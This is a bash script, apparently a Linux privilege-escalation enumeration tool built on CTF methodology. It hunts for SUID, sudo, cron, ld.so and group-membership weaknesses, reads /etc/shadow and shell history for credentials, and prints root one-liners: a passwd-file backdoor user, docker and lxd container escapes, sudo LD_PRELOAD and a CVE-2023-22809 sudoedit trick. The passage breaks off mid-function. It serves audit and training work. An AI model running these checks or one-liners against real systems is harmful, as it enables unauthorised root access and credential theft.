#!/bin/bash

###########################################
# Linux Privilege Escalation Checker
# Based on public CTF/HTB methodology
###########################################

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
echo -e "${PURPLE}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════╗
║   ____       _       _____            _____ _               ║
║  |  _ \ _ __(_)_   _| ____|___  ___  / ____| |__   ___  ___║
║  | |_) | '__| \ \ / /  _| / __|/ __|| |    | '_ \ / _ \/ __|
║  |  __/| |  | |\ V /| |___\__ \ (__ | |____| | | |  __/ (__ ║
║  |_|   |_|  |_| \_/ |_____|___/\___| \_____|_| |_|\___|\___|
║                                                             ║
║              Linux Privilege Escalation Checker            ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# Global variables
QUICK_WINS=0
INTERESTING_FINDS=0
OUTPUT_DIR="./privesc_results_$(date +%Y%m%d_%H%M%S)"

# Help function
show_help() {
    cat << EOF
Usage: $0 [OPTIONS]

OPTIONS:
    -q, --quick         Quick wins only (SUID, sudo, capabilities)
    -f, --full          Full enumeration (recommended)
    -o, --output <dir>  Output directory (default: ./privesc_results_*)
    -l, --linpeas       Download and run LinPEAS
    -p, --pspy          Download and run pspy64
    -h, --help          Show this help message

MODES:
    Quick Mode (-q):    Fast scan for common quick wins
    Full Mode (-f):     Comprehensive enumeration (default)

EXAMPLES:
    $0 -q                    # Quick wins only
    $0 -f                    # Full enumeration
    $0 -f -l                 # Full enumeration + LinPEAS
    $0 -q -o /tmp/results    # Quick scan with custom output

EOF
    exit 0
}

# Parse arguments
QUICK_MODE=false
FULL_MODE=true
RUN_LINPEAS=false
RUN_PSPY=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -q|--quick)
            QUICK_MODE=true
            FULL_MODE=false
            shift
            ;;
        -f|--full)
            FULL_MODE=true
            QUICK_MODE=false
            shift
            ;;
        -o|--output)
            OUTPUT_DIR="$2"
            shift 2
            ;;
        -l|--linpeas)
            RUN_LINPEAS=true
            shift
            ;;
        -p|--pspy)
            RUN_PSPY=true
            shift
            ;;
        -h|--help)
            show_help
            ;;
        *)
            echo -e "${RED}[-] Unknown option: $1${NC}"
            show_help
            ;;
    esac
done

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Logging function
log_result() {
    local category="$1"
    local message="$2"
    local file="$3"

    echo -e "${message}"
    echo -e "${message}" | sed 's/\x1b\[[0-9;]*m//g' >> "$OUTPUT_DIR/${file}"
}

# Quick win found
quick_win() {
    QUICK_WINS=$((QUICK_WINS + 1))
    echo -e "${GREEN}[!!!] QUICK WIN #${QUICK_WINS}: $1${NC}"
    echo "[QUICK WIN #${QUICK_WINS}] $1" >> "$OUTPUT_DIR/QUICK_WINS.txt"
}

# Interesting find
interesting() {
    INTERESTING_FINDS=$((INTERESTING_FINDS + 1))
    echo -e "${YELLOW}[+] INTERESTING: $1${NC}"
    echo "[INTERESTING] $1" >> "$OUTPUT_DIR/interesting_finds.txt"
}

# Info
info() {
    echo -e "${BLUE}[*] $1${NC}"
}

# Section header
section() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}[#] $1${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════${NC}"
}

###########################################
# QUICK WINS CHECKS
###########################################

check_sudo_nopasswd() {
    section "Checking sudo -l (no password)"

    info "Running: sudo -l"

    # Try sudo -l without password
    if timeout 3 sudo -n -l 2>/dev/null | grep -v "may not run sudo" > "$OUTPUT_DIR/sudo_rights.txt"; then
        if [[ -s "$OUTPUT_DIR/sudo_rights.txt" ]]; then
            quick_win "User can run sudo commands without password!"
            cat "$OUTPUT_DIR/sudo_rights.txt"

            # Check for common sudo exploits
            if grep -qE "(ALL|NOPASSWD)" "$OUTPUT_DIR/sudo_rights.txt"; then
                quick_win "NOPASSWD or ALL found in sudo rights - potential easy root!"
            fi

            # Check for specific binaries
            if grep -qE "(vim|vi|nano|less|more|man|awk|find|nmap)" "$OUTPUT_DIR/sudo_rights.txt"; then
                quick_win "Text editor or GTFOBins binary in sudo! Check: https://gtfobins.github.io/"
            fi
        fi
    else
        info "No sudo rights without password (or sudo not available)"
    fi
}

check_suid_binaries() {
    section "Checking SUID Binaries"

    info "Finding all SUID binaries..."

    find / -perm -4000 -type f 2>/dev/null > "$OUTPUT_DIR/suid_binaries.txt"

    # Common SUID binaries to ignore
    common_suid="passwd|chsh|chfn|su|sudo|mount|umount|ping|ping6"

    # Interesting SUID binaries
    cat "$OUTPUT_DIR/suid_binaries.txt" | grep -vE "$common_suid" > "$OUTPUT_DIR/interesting_suid.txt"

    if [[ -s "$OUTPUT_DIR/interesting_suid.txt" ]]; then
        quick_win "Uncommon SUID binaries found!"
        cat "$OUTPUT_DIR/interesting_suid.txt"

        # Check for known exploitable binaries
        if grep -qE "(nmap|vim|find|bash|more|less|nano|cp|mv|awk|python|perl|ruby|gcc|base64)" "$OUTPUT_DIR/interesting_suid.txt"; then
            quick_win "Known exploitable SUID binary found! Check GTFOBins: https://gtfobins.github.io/"
        fi
    else
        info "No interesting SUID binaries found"
    fi
}

check_capabilities() {
    section "Checking Capabilities"

    info "Finding binaries with capabilities..."

    if command -v getcap &> /dev/null; then
        getcap -r / 2>/dev/null > "$OUTPUT_DIR/capabilities.txt"

        if [[ -s "$OUTPUT_DIR/capabilities.txt" ]]; then
            interesting "Binaries with capabilities found:"
            cat "$OUTPUT_DIR/capabilities.txt"

            # Check for dangerous capabilities
            if grep -qE "cap_setuid|cap_setgid|cap_dac_override|cap_dac_read_search" "$OUTPUT_DIR/capabilities.txt"; then
                quick_win "Dangerous capability found (setuid/setgid/dac_override)!"
                grep -E "cap_setuid|cap_setgid|cap_dac_override|cap_dac_read_search" "$OUTPUT_DIR/capabilities.txt"
            fi
        else
            info "No capabilities found"
        fi
    else
        info "getcap not available"
    fi
}

check_writable_etc_passwd() {
    section "Checking /etc/passwd Writability"

    if [[ -w /etc/passwd ]]; then
        quick_win "/etc/passwd is writable! Add root user with: openssl passwd -1 password123"
        echo "Example: echo 'hacker:\$1\$xyz\$...:0:0:root:/root:/bin/bash' >> /etc/passwd"
    else
        info "/etc/passwd is not writable"
    fi
}

check_writable_etc_shadow() {
    section "Checking /etc/shadow Readability/Writability"

    if [[ -r /etc/shadow ]]; then
        quick_win "/etc/shadow is readable! Extract password hashes"
        head -5 /etc/shadow 2>/dev/null
    fi

    if [[ -w /etc/shadow ]]; then
        quick_win "/etc/shadow is writable! Modify root password"
    fi
}

check_docker_group() {
    section "Checking Docker Group Membership"

    if groups | grep -qE "docker|lxd|lxc"; then
        quick_win "User is in docker/lxd/lxc group! Easy root via container escape"
        echo "Docker: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
        echo "LXD: https://www.hackingarticles.in/lxd-privilege-escalation/"
    else
        info "Not in docker/lxd/lxc groups"
    fi
}

check_nfs_exports() {
    section "Checking NFS Exports (no_root_squash)"

    if [[ -f /etc/exports ]]; then
        if grep -qE "no_root_squash|no_all_squash" /etc/exports; then
            quick_win "NFS exports with no_root_squash found!"
            grep -E "no_root_squash|no_all_squash" /etc/exports
            cat /etc/exports > "$OUTPUT_DIR/nfs_exports.txt"
        else
            info "NFS exports exist but no no_root_squash"
        fi
    fi
}

check_cron_writable() {
    section "Checking Writable Cron Jobs"

    info "Checking cron directories for writable files..."

    # Check system cron
    for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.monthly /etc/cron.weekly; do
        if [[ -d "$dir" ]]; then
            find "$dir" -type f -writable 2>/dev/null >> "$OUTPUT_DIR/writable_cron.txt"
        fi
    done

    if [[ -s "$OUTPUT_DIR/writable_cron.txt" ]]; then
        quick_win "Writable cron jobs found!"
        cat "$OUTPUT_DIR/writable_cron.txt"
    else
        info "No writable cron jobs found"
    fi

    # Check user crontabs
    if [[ -r /var/spool/cron/crontabs ]]; then
        ls -la /var/spool/cron/crontabs/ 2>/dev/null
    fi
}

check_path_hijacking() {
    section "Checking PATH for Hijacking Opportunities"

    info "Current PATH: $PATH"
    echo "PATH=$PATH" > "$OUTPUT_DIR/path_info.txt"

    # Check if current directory is in PATH
    if echo "$PATH" | grep -qE "^\.:|:\.:|:\.$"; then
        quick_win "Current directory (.) is in PATH! Possible PATH hijacking"
    fi

    # Check for writable directories in PATH
    info "Checking writable directories in PATH..."
    echo "$PATH" | tr ':' '\n' | while read -r dir; do
        if [[ -d "$dir" && -w "$dir" ]]; then
            quick_win "Writable directory in PATH: $dir"
            echo "$dir" >> "$OUTPUT_DIR/writable_path_dirs.txt"
        fi
    done
}

check_ssh_keys() {
    section "Checking for SSH Keys"

    info "Looking for SSH private keys..."

    find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null > "$OUTPUT_DIR/ssh_private_keys.txt"

    if [[ -s "$OUTPUT_DIR/ssh_private_keys.txt" ]]; then
        interesting "SSH private keys found:"
        cat "$OUTPUT_DIR/ssh_private_keys.txt"

        # Check if keys are readable
        while IFS= read -r key; do
            if [[ -r "$key" ]]; then
                quick_win "Readable SSH private key: $key"
            fi
        done < "$OUTPUT_DIR/ssh_private_keys.txt"
    fi

    # Check authorized_keys writability
    if [[ -w ~/.ssh/authorized_keys ]]; then
        quick_win "~/.ssh/authorized_keys is writable! Add your public key"
    fi
}

###########################################
# FULL ENUMERATION CHECKS
###########################################

check_kernel_exploits() {
    section "Checking Kernel Version for Known Exploits"

    kernel=$(uname -r)
    info "Kernel version: $kernel"
    echo "Kernel: $kernel" > "$OUTPUT_DIR/kernel_info.txt"

    # Known vulnerable kernels
    if [[ "$kernel" =~ ^2\. ]] || [[ "$kernel" =~ ^3\. ]]; then
        interesting "Old kernel version detected (2.x or 3.x) - likely vulnerable to DirtyCOW or similar"
    fi

    # Suggest tools
    info "Check https://github.com/jondonas/linux-exploit-suggester-2"
    info "Or use: searchsploit kernel $(uname -r | cut -d'-' -f1)"
}

check_interesting_files() {
    section "Checking for Interesting Files"

    info "Looking for configuration files, backups, and credentials..."

    # Database files
    find / -name "*.db" -o -name "*.sqlite" -o -name "*.sql" 2>/dev/null | head -20 > "$OUTPUT_DIR/database_files.txt"
    if [[ -s "$OUTPUT_DIR/database_files.txt" ]]; then
        interesting "Database files found:"
        cat "$OUTPUT_DIR/database_files.txt"
    fi

    # Backup files
    find / -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null | grep -v "proc\|sys" | head -20 > "$OUTPUT_DIR/backup_files.txt"
    if [[ -s "$OUTPUT_DIR/backup_files.txt" ]]; then
        interesting "Backup files found:"
        cat "$OUTPUT_DIR/backup_files.txt"
    fi

    # Config files in home directories
    find /home -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null > "$OUTPUT_DIR/config_files.txt"
    if [[ -s "$OUTPUT_DIR/config_files.txt" ]]; then
        interesting "Config files in /home:"
        cat "$OUTPUT_DIR/config_files.txt"
    fi

    # Password files
    find / -name "*password*" -o -name "*passwd*" -o -name "credentials*" 2>/dev/null | grep -v "proc\|sys" | head -20 > "$OUTPUT_DIR/password_files.txt"
    if [[ -s "$OUTPUT_DIR/password_files.txt" ]]; then
        interesting "Files with 'password' in name:"
        cat "$OUTPUT_DIR/password_files.txt"
    fi
}

check_history_files() {
    section "Checking Command History Files"

    info "Searching for credentials in history files..."

    # Bash history
    if [[ -r ~/.bash_history ]]; then
        grep -iE "password|passwd|pwd|pass|secret|key|token" ~/.bash_history > "$OUTPUT_DIR/bash_history_creds.txt" 2>/dev/null
        if [[ -s "$OUTPUT_DIR/bash_history_creds.txt" ]]; then
            interesting "Potential credentials in bash history:"
            cat "$OUTPUT_DIR/bash_history_creds.txt"
        fi
    fi

    # MySQL history
    if [[ -r ~/.mysql_history ]]; then
        interesting "MySQL history file found and readable: ~/.mysql_history"
        cat ~/.mysql_history > "$OUTPUT_DIR/mysql_history.txt"
    fi
}

check_running_services() {
    section "Checking Running Services"

    info "Listing running services..."

    # Services running as root
    ps aux | grep "^root" > "$OUTPUT_DIR/root_processes.txt"
    interesting "Processes running as root: $(wc -l < "$OUTPUT_DIR/root_processes.txt") processes"

    # Listening ports
    netstat -tulpn 2>/dev/null > "$OUTPUT_DIR/listening_ports.txt" || ss -tulpn 2>/dev/null > "$OUTPUT_DIR/listening_ports.txt"
    if [[ -s "$OUTPUT_DIR/listening_ports.txt" ]]; then
        interesting "Listening ports found:"
        cat "$OUTPUT_DIR/listening_ports.txt"
    fi
}

check_writable_services() {
    section "Checking Writable Service Files"

    info "Looking for writable systemd service files..."

    find /etc/systemd/system /lib/systemd/system -type f -writable 2>/dev/null > "$OUTPUT_DIR/writable_services.txt"
    if [[ -s "$OUTPUT_DIR/writable_services.txt" ]]; then
        quick_win "Writable systemd service files found!"
        cat "$OUTPUT_DIR/writable_services.txt"
    fi
}

check_tmux_screen() {
    section "Checking for Active tmux/screen Sessions"

    # tmux sessions
    if command -v tmux &> /dev/null; then
        tmux ls 2>/dev/null > "$OUTPUT_DIR/tmux_sessions.txt"
        if [[ -s "$OUTPUT_DIR/tmux_sessions.txt" ]]; then
            interesting "Active tmux sessions found:"
            cat "$OUTPUT_DIR/tmux_sessions.txt"
        fi
    fi

    # screen sessions
    if command -v screen &> /dev/null; then
        screen -ls 2>/dev/null > "$OUTPUT_DIR/screen_sessions.txt"
        if [[ -s "$OUTPUT_DIR/screen_sessions.txt" ]]; then
            interesting "Active screen sessions found:"
            cat "$OUTPUT_DIR/screen_sessions.txt"
        fi
    fi
}

check_polkit() {
    section "Checking Polkit (pkexec) Version"

    if command -v pkexec &> /dev/null; then
        pkexec_version=$(pkexec --version 2>/dev/null | head -1)
        info "Polkit version: $pkexec_version"

        # CVE-2021-4034 (PwnKit)
        if [[ "$pkexec_version" =~ 0\.10[0-5] ]]; then
            quick_win "Vulnerable to CVE-2021-4034 (PwnKit)! Easy root exploit available"
        fi
    fi
}

check_mail() {
    section "Checking Mail Spool"

    if [[ -d /var/mail ]]; then
        ls -la /var/mail/ 2>/dev/null > "$OUTPUT_DIR/mail_spool.txt"
        if [[ -s "$OUTPUT_DIR/mail_spool.txt" ]]; then
            interesting "Mail spool files found:"
            cat "$OUTPUT_DIR/mail_spool.txt"
        fi
    fi
}

check_wild_cards() {
    section "Checking for Wildcard Injection Opportunities"

    info "Looking for scripts/crons using wildcards..."

    # Check cron files for tar/rsync wildcards
    grep -r "tar.*\*" /etc/cron* 2>/dev/null > "$OUTPUT_DIR/wildcard_tar.txt"
    grep -r "rsync.*\*" /etc/cron* 2>/dev/null >> "$OUTPUT_DIR/wildcard_rsync.txt"

    if [[ -s "$OUTPUT_DIR/wildcard_tar.txt" ]] || [[ -s "$OUTPUT_DIR/wildcard_rsync.txt" ]]; then
        interesting "Potential wildcard injection found in cron jobs!"
        cat "$OUTPUT_DIR/wildcard_tar.txt" "$OUTPUT_DIR/wildcard_rsync.txt" 2>/dev/null
    fi
}

###########################################
# EXTENDED CHECKS
###########################################

check_gtfobins_crossref() {
    section "GTFOBins SUID/Sudo Cross-Reference"

    info "Cross-referencing SUID binaries and sudo rights against GTFOBins list..."

    # Comprehensive GTFOBins list (binaries known to allow privilege escalation)
    local gtfobins_list="aa-exec|ab|agetty|alpine|ansible-playbook|ansible-test|aoss|apt-get|apt|ar|aria2c|arj|arp|as|ascii-xfr|ascii85|ash|aspell|at|atobm|awk|aws|base32|base58|base64|basenc|bash|batcat|bc|bconsole|bpftrace|bridge|bundler|busctl|busybox|byebug|bzip2|c89|c99|cabal|cancel|capsh|cat|cdist|certbot|check_by_ssh|check_cups|check_log|check_memory|check_raid|check_ssl_cert|check_statusfile|chmod|choom|chown|chroot|cmp|cobc|column|comm|composer|cowsay|cowthink|cp|cpan|cpio|cpulimit|crash|crontab|csh|csplit|csvtool|cupsfilter|curl|cut|dash|date|dd|debugfs|dialog|diff|dig|dmesg|dmidecode|dmsetup|dnf|docker|dosbox|dpkg|dstat|dvips|easy_install|eb|ed|efax|emacs|env|eqn|espeak|ex|exiftool|expand|expect|facter|file|find|fish|flock|fmt|fold|fping|ftp|gawk|gcc|gcloud|gcore|gdb|gem|genie|ghc|ghci|gimp|ginsh|git|grc|grep|gtester|gzip|hd|head|hexdump|highlight|hping3|iconv|iftop|install|ionice|ip|irb|ispell|jjs|joe|join|journalctl|jq|jrunscript|jtag|julia|knife|ksh|ksshell|kubectl|latex|latexmk|ld|ldconfig|less|lftp|loginctl|logsave|look|ltrace|lua|lualatex|luatex|lwp-download|lwp-request|mail|make|man|mawk|minicom|more|mosquitto|mount|msgattrib|msgcat|msgconv|msgfilter|msgmerge|msguniq|mtr|multitime|mv|mysql|nano|nasm|nawk|nc|ncdu|ncftp|neofetch|nft|nice|nl|nm|nmap|node|nohup|npm|nroff|nsenter|ntpdate|octave|od|openssl|openvpn|opkg|pandoc|paste|pdb|pdflatex|pdftex|perf|perl|perlbug|pg|php|pic|pico|pidstat|pip|pkexec|pkttyagent|pr|pry|psql|ptx|puppet|python|rake|readelf|realpath|red|redcarpet|restic|rev|rlwrap|rpm|rpmdb|rpmquery|rpmverify|rsync|rtorrent|ruby|run-mailcap|run-parts|rview|rvim|sash|scanmem|scp|screen|script|scrot|sed|service|setarch|setfacl|setlock|sftp|sg|shuf|slsh|smbclient|snap|socat|socket|soelim|softlimit|sort|split|sqlite3|ss|ssh-agent|ssh-keygen|ssh-keyscan|ssh|sshpass|start-stop-daemon|stdbuf|strace|strings|su|sysctl|systemctl|systemd-resolve|tac|tail|tar|task|taskset|tasksh|tbl|tclsh|tcpdump|tdbtool|tee|telnet|terraform|tex|tftp|tic|time|timedatectl|timeout|tmate|tmux|top|torify|torsocks|troff|tshark|ul|unexpand|uniq|unshare|unsquashfs|unzip|update-alternatives|uudecode|uuencode|vagrant|valgrind|vi|view|vigr|vim|vimdiff|vipw|virsh|volatility|w3m|wall|watch|wc|wget|whiptail|wireshark|wish|xargs|xdg-user-dir|xdotool|xelatex|xetex|xmodmap|xmore|xpad|xxd|xz|yarn|yash|yelp|yum|zathura|zip|zsh|zsoelim|zypper"

    local found_gtfo=0

    # Cross-reference SUID binaries
    if [[ -f "$OUTPUT_DIR/suid_binaries.txt" ]]; then
        while IFS= read -r suid_bin; do
            local binname
            binname=$(basename "$suid_bin")
            if echo "$binname" | grep -qwE "$gtfobins_list"; then
                quick_win "GTFOBins SUID match: $suid_bin (https://gtfobins.github.io/gtfobins/${binname}/#suid)"
                found_gtfo=1
            fi
        done < "$OUTPUT_DIR/suid_binaries.txt"
    else
        # Generate SUID list if not already done
        find / -perm -4000 -type f 2>/dev/null | while IFS= read -r suid_bin; do
            local binname
            binname=$(basename "$suid_bin")
            if echo "$binname" | grep -qwE "$gtfobins_list"; then
                quick_win "GTFOBins SUID match: $suid_bin (https://gtfobins.github.io/gtfobins/${binname}/#suid)"
                found_gtfo=1
            fi
        done
    fi

    # Cross-reference sudo rights
    if [[ -f "$OUTPUT_DIR/sudo_rights.txt" ]]; then
        while IFS= read -r line; do
            # Extract binary name from sudo line (last field or path)
            local sudocmd
            sudocmd=$(echo "$line" | awk '{print $NF}')
            local binname
            binname=$(basename "$sudocmd")
            if echo "$binname" | grep -qwE "$gtfobins_list"; then
                quick_win "GTFOBins sudo match: $sudocmd (https://gtfobins.github.io/gtfobins/${binname}/#sudo)"
                found_gtfo=1
            fi
        done < "$OUTPUT_DIR/sudo_rights.txt"
    fi

    if [[ $found_gtfo -eq 0 ]]; then
        info "No GTFOBins matches found in SUID or sudo"
    fi
}

check_ld_preload_sudo() {
    section "LD_PRELOAD/LD_LIBRARY_PATH via Sudo"

    info "Checking sudo configuration for LD_PRELOAD/LD_LIBRARY_PATH preservation..."

    local sudo_output
    sudo_output=$(timeout 3 sudo -n -l 2>/dev/null)

    if [[ -n "$sudo_output" ]]; then
        if echo "$sudo_output" | grep -qiE "env_keep.*LD_PRELOAD"; then
            quick_win "sudo preserves LD_PRELOAD! Compile malicious .so and run: sudo LD_PRELOAD=/tmp/evil.so <allowed_cmd>"
        fi

        if echo "$sudo_output" | grep -qiE "env_keep.*LD_LIBRARY_PATH"; then
            quick_win "sudo preserves LD_LIBRARY_PATH! Hijack shared libraries for any sudo-allowed binary"
        fi

        if echo "$sudo_output" | grep -qiE "SETENV"; then
            quick_win "SETENV found in sudo rules! Can set LD_PRELOAD/LD_LIBRARY_PATH with sudo"
        fi

        if ! echo "$sudo_output" | grep -qiE "env_keep.*(LD_PRELOAD|LD_LIBRARY_PATH)|SETENV"; then
            info "No LD_PRELOAD/LD_LIBRARY_PATH preservation in sudo"
        fi
    else
        info "Cannot read sudo -l without password"
    fi
}

check_systemd_timers() {
    section "Systemd Timers (Writable ExecStart)"

    info "Listing all systemd timers and checking for writable ExecStart scripts..."

    if ! command -v systemctl &> /dev/null; then
        info "systemctl not available"
        return
    fi

    systemctl list-timers --all --no-pager 2>/dev/null > "$OUTPUT_DIR/systemd_timers.txt"

    if [[ -s "$OUTPUT_DIR/systemd_timers.txt" ]]; then
        interesting "Active systemd timers:"
        cat "$OUTPUT_DIR/systemd_timers.txt"

        # For each timer, find the associated service and check ExecStart
        systemctl list-timers --all --no-pager 2>/dev/null | awk 'NR>1 && NF>1 {print $NF}' | grep -v "^$" | grep -v "ACTIVATES" | while IFS= read -r timer_unit; do
            # Get the service associated with this timer
            local service_unit
            service_unit=$(echo "$timer_unit" | sed 's/\.timer$/.service/')

            # Get ExecStart from the service
            local exec_start
            exec_start=$(systemctl show "$service_unit" -p ExecStart 2>/dev/null | sed 's/ExecStart=//;s/{ path=//;s/ ;.*//;s/}$//')

            if [[ -n "$exec_start" && -f "$exec_start" ]]; then
                if [[ -w "$exec_start" ]]; then
                    quick_win "Writable timer ExecStart script: $exec_start (timer: $timer_unit)"
                fi
            fi

            # Also check the unit file paths
            local unit_path
            unit_path=$(systemctl show "$service_unit" -p FragmentPath 2>/dev/null | sed 's/FragmentPath=//')
            if [[ -n "$unit_path" && -f "$unit_path" && -w "$unit_path" ]]; then
                quick_win "Writable timer service file: $unit_path"
            fi
        done
    else
        info "No systemd timers found"
    fi
}

check_shared_object_hijacking() {
    section "Shared Object Hijacking (SUID RPATH)"

    info "Checking SUID binaries for writable RPATH directories..."

    if ! command -v readelf &> /dev/null && ! command -v objdump &> /dev/null; then
        info "Neither readelf nor objdump available - skipping RPATH check"
        return
    fi

    local suid_file="$OUTPUT_DIR/suid_binaries.txt"
    if [[ ! -s "$suid_file" ]]; then
        find / -perm -4000 -type f 2>/dev/null > "$suid_file"
    fi

    local found_hijack=0
    while IFS= read -r suid_bin; do
        local rpath_dirs=""
        if command -v readelf &> /dev/null; then
            rpath_dirs=$(readelf -d "$suid_bin" 2>/dev/null | grep -E "RPATH|RUNPATH" | sed 's/.*\[//;s/\]//')
        elif command -v objdump &> /dev/null; then
            rpath_dirs=$(objdump -p "$suid_bin" 2>/dev/null | grep -E "RPATH|RUNPATH" | awk '{print $2}')
        fi

        if [[ -n "$rpath_dirs" ]]; then
            echo "$rpath_dirs" | tr ':' '\n' | while IFS= read -r rdir; do
                if [[ -d "$rdir" && -w "$rdir" ]]; then
                    quick_win "Writable RPATH in SUID binary: $suid_bin -> $rdir"
                    found_hijack=1
                elif [[ ! -d "$rdir" ]]; then
                    # Parent directory writable = can create the dir
                    local parent_dir
                    parent_dir=$(dirname "$rdir")
                    if [[ -d "$parent_dir" && -w "$parent_dir" ]]; then
                        quick_win "SUID binary $suid_bin has RPATH $rdir (does not exist, parent is writable!)"
                        found_hijack=1
                    fi
                fi
            done
        fi

        # Also check for missing shared objects via ldd
        if command -v ldd &> /dev/null; then
            local missing_libs
            missing_libs=$(ldd "$suid_bin" 2>/dev/null | grep "not found")
            if [[ -n "$missing_libs" ]]; then
                interesting "SUID binary $suid_bin has missing shared objects:"
                echo "$missing_libs"
            fi
        fi
    done < "$suid_file"

    if [[ $found_hijack -eq 0 ]]; then
        info "No writable RPATH directories found in SUID binaries"
    fi
}

check_cve_2021_3156() {
    section "CVE-2021-3156 (Baron Samedit / Sudo Heap Overflow)"

    info "Checking sudo version for CVE-2021-3156 vulnerability..."

    if ! command -v sudo &> /dev/null; then
        info "sudo not installed"
        return
    fi

    local sudo_version
    sudo_version=$(sudo -V 2>/dev/null | head -1 | grep -oP '[\d.]+[a-z]?[0-9]*' | head -1)
    info "Sudo version: $sudo_version"

    # Vulnerable versions: 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1
    local major minor patch
    major=$(echo "$sudo_version" | cut -d. -f1)
    minor=$(echo "$sudo_version" | cut -d. -f2)
    patch=$(echo "$sudo_version" | cut -d. -f3 | grep -oP '^\d+')

    local potentially_vulnerable=false

    if [[ "$major" -eq 1 && "$minor" -eq 8 ]]; then
        if [[ "${patch:-0}" -ge 2 && "${patch:-0}" -le 31 ]]; then
            potentially_vulnerable=true
        fi
    elif [[ "$major" -eq 1 && "$minor" -eq 9 ]]; then
        if [[ "${patch:-0}" -le 5 ]]; then
            potentially_vulnerable=true
        fi
    fi

    if [[ "$potentially_vulnerable" == true ]]; then
        interesting "Sudo version $sudo_version may be vulnerable to CVE-2021-3156"

        # Non-destructive test: sudoedit -s triggers the bug
        info "Running non-destructive test (sudoedit -s)..."
        local test_output
        test_output=$(sudoedit -s '\' 2>&1)

        if echo "$test_output" | grep -q "sudoedit:"; then
            # If it shows "sudoedit:" error (not "usage:"), it's vulnerable
            if ! echo "$test_output" | grep -qi "usage"; then
                quick_win "CVE-2021-3156 (Baron Samedit) CONFIRMED! Sudo $sudo_version is exploitable. Use: https://github.com/blasty/CVE-2021-3156"
            else
                info "Non-destructive test suggests patched version"
            fi
        else
            info "Non-destructive test inconclusive"
        fi
    else
        info "Sudo version $sudo_version is not in the vulnerable range for CVE-2021-3156"
    fi
}

check_cve_2023_22809() {
    section "CVE-2023-22809 (Sudoedit Bypass)"

    info "Checking for CVE-2023-22809 (sudoedit arbitrary file write)..."

    if ! command -v sudo &> /dev/null; then
        info "sudo not installed"
        return
    fi

    local sudo_version
    sudo_version=$(sudo -V 2>/dev/null | head -1 | grep -oP '[\d.]+[a-z]?[0-9]*' | head -1)
    info "Sudo version: $sudo_version"

    # Affected: sudo 1.8.0 through 1.9.12p1
    local major minor patch
    major=$(echo "$sudo_version" | cut -d. -f1)
    minor=$(echo "$sudo_version" | cut -d. -f2)
    patch=$(echo "$sudo_version" | cut -d. -f3 | grep -oP '^\d+')

    local potentially_vulnerable=false

    if [[ "$major" -eq 1 ]]; then
        if [[ "$minor" -eq 8 && "${patch:-0}" -ge 0 ]]; then
            potentially_vulnerable=true
        elif [[ "$minor" -eq 9 && "${patch:-0}" -le 12 ]]; then
            potentially_vulnerable=true
        fi
    fi

    if [[ "$potentially_vulnerable" == true ]]; then
        # Check if sudoedit is available via sudo -l
        local sudo_output
        sudo_output=$(timeout 3 sudo -n -l 2>/dev/null)

        if echo "$sudo_output" | grep -qiE "sudoedit|env_editor|EDITOR"; then
            quick_win "CVE-2023-22809: Sudo $sudo_version + sudoedit allowed! Exploit: EDITOR='vim -- /etc/shadow' sudoedit <allowed_file>"
        else
            interesting "Sudo $sudo_version may be vulnerable to CVE-2023-22809 but sudoedit not found in sudo -l"
        fi
    else
        info "Sudo version $sudo_version is not in the vulnerable range for CVE-2023-22809"
    fi
}

check_writable_ld_preload_conf() {
    section "Writable /etc/ld.so.preload and /etc/ld.so.conf.d/"

    info "Checking ld.so preload and library config for writability..."

    # /etc/ld.so.preload - instant root if writable (libraries loaded into every process)
    if [[ -e /etc/ld.so.preload ]]; then
        if [[ -w /etc/ld.so.preload ]]; then
            quick_win "/etc/ld.so.preload is WRITABLE! Add malicious .so to get code execution in every process (including root-owned)"
        else
            info "/etc/ld.so.preload exists but is not writable"
        fi
    else
        # Check if we can create it
        if [[ -w /etc ]]; then
            quick_win "/etc/ld.so.preload does not exist but /etc is writable! Create it to inject into all processes"
        else
            info "/etc/ld.so.preload does not exist (cannot create)"
        fi
    fi

    # /etc/ld.so.conf.d/ - add custom library search paths
    if [[ -d /etc/ld.so.conf.d ]]; then
        if [[ -w /etc/ld.so.conf.d ]]; then
            quick_win "/etc/ld.so.conf.d/ is WRITABLE! Add a .conf file pointing to a dir with malicious .so files, then wait for ldconfig"
        fi

        # Check individual conf files
        find /etc/ld.so.conf.d -type f -writable 2>/dev/null | while IFS= read -r conffile; do
            quick_win "Writable ld.so.conf.d file: $conffile (modify library search paths)"
        done
    fi

    # /etc/ld.so.conf itself
    if [[ -w /etc/ld.so.conf ]]; then
        quick_win "/etc/ld.so.conf is WRITABLE! Modify library search paths for all dynamically linked programs"
    fi

    if [[ ! -w /etc/ld.so.preload ]] && [[ ! -w /etc/ld.so.conf ]] && [[ ! -w /etc/ld.so.conf.d ]] 2>/dev/null; then
        info "No writable ld.so configuration files found"
    fi
}

check_lxd_lxc_group() {
    section "LXD/LXC Group Membership"

    info "Checking if current user is in lxd or lxc group..."

    local current_groups
    current_groups=$(groups 2>/dev/null)

    if echo "$current_groups" | grep -qw "lxd"; then
        quick_win "User is in 'lxd' group! Root via: lxc init ubuntu:18.04 privesc -c security.privileged=true && lxc config device add privesc host-root disk source=/ path=/mnt/root && lxc start privesc && lxc exec privesc /bin/sh"
    fi

    if echo "$current_groups" | grep -qw "lxc"; then
        quick_win "User is in 'lxc' group! Can create privileged containers to access host filesystem"
    fi

    if ! echo "$current_groups" | grep -qwE "lxd|lxc"; then
        info "Not in lxd or lxc groups"
    fi
}

check_disk_shadow_group() {
    section "Disk Group and Shadow Group Membership"

    info "Checking for disk and shadow group membership..."

    local current_groups
